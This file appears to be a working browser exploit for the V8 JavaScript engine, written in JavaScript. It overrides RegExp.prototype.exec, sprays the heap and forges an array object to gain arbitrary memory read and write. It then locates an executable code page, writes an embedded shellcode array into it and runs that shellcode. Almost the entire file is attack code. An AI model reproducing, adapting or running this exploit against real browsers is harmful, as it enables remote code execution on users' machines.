// Version 8.3.110.13
function hex(a, b=-1) {
    if (b != -1) {
        a = '00000000'+a.toString(16);
        b = '00000000'+b.toString(16);
        a = a.substring(a.length-8,a.length);
        b = b.substring(b.length-8,b.length);
        return '0x'+a+b;
    }
    return '0x' + a.toString(16);
}
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
Number.prototype.hex = function() {
    return '0x' + this.toString(16);
};

function gc() {
    for (let i = 0; i < 0x10000; i++) {
        new String
    }
}

function Module() {
    "use asm"
    function f1() {}
    return {f1: f1}
}

const shellcode = [0x90909090,0xf0e48366,0x5a606a50,0x6c616368,0x48595463,0x4865d429,0x8b48328b,0x8b481876,0xad481076,0x48308b48,0x03307e8b,0x5c8b3c57,0x748b2817,0x0148201f,0x1f548bfe,0x2cb70f24,0x02528d17,0x073c81ad,0x456e6957,0x748bef75,0x01481c1f,0xae348bfe,0x99f70148,0xfeebd7ff];

let bk_f64a = new Float64Array(0x80);
let t_ab = new ArrayBuffer(0x20);
let u64a = new BigUint64Array(t_ab);
let f64a = new Float64Array(t_ab);
let u32a = new Uint32Array(t_ab);
let u8a = new Uint8Array(t_ab);

let spray_count = 0x4000;
let spray_array = new Array(spray_count);
const c_rwx_offset = 0xa5;
/* DoubleArrayMap: %DebugPrint(new Array(1.1, 2.2)); */
const c_double_arr_map = 0x082810e9;
/* SyntaxError's PropertyArray: %DebugPrint(SyntaxError); */
const c_syntax_error_property_array = 0x0824e529;
u32a[0] = 0x20000;
u32a[1] = c_double_arr_map;
let val_1 = String(f64a[0]) + ',';
u32a[0] = 0; // empty_fixed_array
u32a[1] = c_syntax_error_property_array;
let val_2 = String(f64a[0]) + ',';
let val = val_1 + val_2;
spray = new Function(`for (let i = 0; i < spray_count; i++) spray_array[i] = new Array(${val.repeat(48)+val_1})`);

let f1 = Module().f1;
let evil_ta = new Uint32Array(4);
SyntaxError.o = f1;
SyntaxError.x = evil_ta;
gc();gc();

let re = /-/g;
let first = true;
let ori_exec_func = RegExp.prototype.exec;
RegExp.prototype.exec = function() {
    if (first) {
        first = false;
        this.lastIndex = 1073741825;
        gc();gc();
        return [''];
    } else {
        gc(); gc();
        spray();

        let evil_arr = this.lastIndex;
        bk_f64a[0] = evil_arr[0];
        bk_f64a[1] = evil_arr[1];
        bk_f64a[2] = evil_arr[2];
        f64a[0] = evil_arr[0];
        f64a[1] = evil_arr[1];
        let f_addr = u32a[1];
        let ta_addr = u32a[2];

        u32a[0] = c_double_arr_map;
        u32a[1] = c_syntax_error_property_array + 8;
        u32a[2] = ta_addr + 0x10;
        u32a[3] = 0x10000;
        evil_arr[0] = f64a[0];
        evil_arr[1] = f64a[1];

        // reset lastIndex to avoid GC crash
        evil_arr = 0;
        this.lastIndex = 0;

        let fake_evil_arr = SyntaxError.o;

        f64a[0] = fake_evil_arr[0];
        f64a[1] = fake_evil_arr[1];
        f64a[2] = fake_evil_arr[2];
        f64a[3] = fake_evil_arr[3];

        u32a[0] = 0x10000;
        u32a[2] = 0x10000;
        u32a[4] = 0;
        u32a[6] = f_addr - 1;
        let v8_heap_base = f64a[2];

        fake_evil_arr[0] = f64a[0];
        fake_evil_arr[1] = f64a[1];
        fake_evil_arr[2] = f64a[2];
        fake_evil_arr[3] = f64a[3];

        function set_addr(addr_low, addr_high) {
            u32a[0] = addr_low;
            u32a[1] = addr_high;
            fake_evil_arr[2] = f64a[0];
            fake_evil_arr[3] = 0;
        }
        function v8_setaddr(addr) {
            u32a[0] = addr;
            u32a[1] = 0;
            fake_evil_arr[2] = v8_heap_base;
            fake_evil_arr[3] = f64a[0];
        }
        function v8_read(addr, bits=4) {
            if (bits == 4) {
                v8_setaddr(addr);
                return evil_ta[0];
            } else if (bits == 8) {
                v8_setaddr(addr);
                return [evil_ta[0], evil_ta[1]];
            }
        }
        function v8_write(addr, val) {
            v8_setaddr(addr);
            evil_ta[i] = val;
        }

        let shared_info = evil_ta[3];
        let rwx_ptr = shared_info - c_rwx_offset;
        set_addr(...v8_read(rwx_ptr, 8));

        shellcode.forEach((sc, i) => {
            evil_ta[i] = sc;
        });
        f1();
    }
}
try {
    '1-0'.replace(re, {valueOf: ()=>10});
} catch(e) {
    console.log(e);
}
